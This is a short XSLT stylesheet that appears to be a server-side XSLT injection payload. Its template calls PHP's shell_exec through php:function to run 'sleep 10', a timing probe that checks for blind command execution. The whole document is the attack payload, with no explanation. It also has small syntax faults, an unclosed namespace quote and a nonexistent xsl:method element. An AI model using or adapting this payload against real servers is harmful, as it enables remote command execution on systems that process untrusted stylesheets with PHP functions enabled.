<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform xmlns:php="http://php.net/xsl">
    <xsl:method output="html">
    <xsl:template match="/">
      <xsl:value-of select="php:function('shell_exec', 'sleep 10')" />
    </xsl:template>
</xsl:stylesheet>
